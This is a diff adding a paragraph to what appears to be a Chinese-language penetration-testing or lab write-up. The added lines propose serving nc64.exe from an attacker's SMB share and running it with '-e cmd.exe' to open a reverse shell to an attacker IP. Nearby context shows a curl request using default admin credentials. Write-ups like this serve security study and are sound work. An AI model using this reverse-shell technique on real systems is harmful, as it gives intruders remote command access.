@@ -263,6 +263,10 @@ curl -u admin:password -k "http://127.0.0.1:8443/query/shell"
 
 如果是powershell路線的，可能會有交互性不太好的問題，再使用一些改善指令就可以，都是一樣的
 
+其實還有一個辦法，就是在攻擊機本地開啟SMB Server託管nc64.exe，然後透過應用程式呼叫Share，可以去嘗試一下
+```bash
+\\10.10.x.x\share\nc64.exe -e cmd.exe 10.10.x.x 1234
+```
 
 ### 2.5 最終成果(Impact)
 
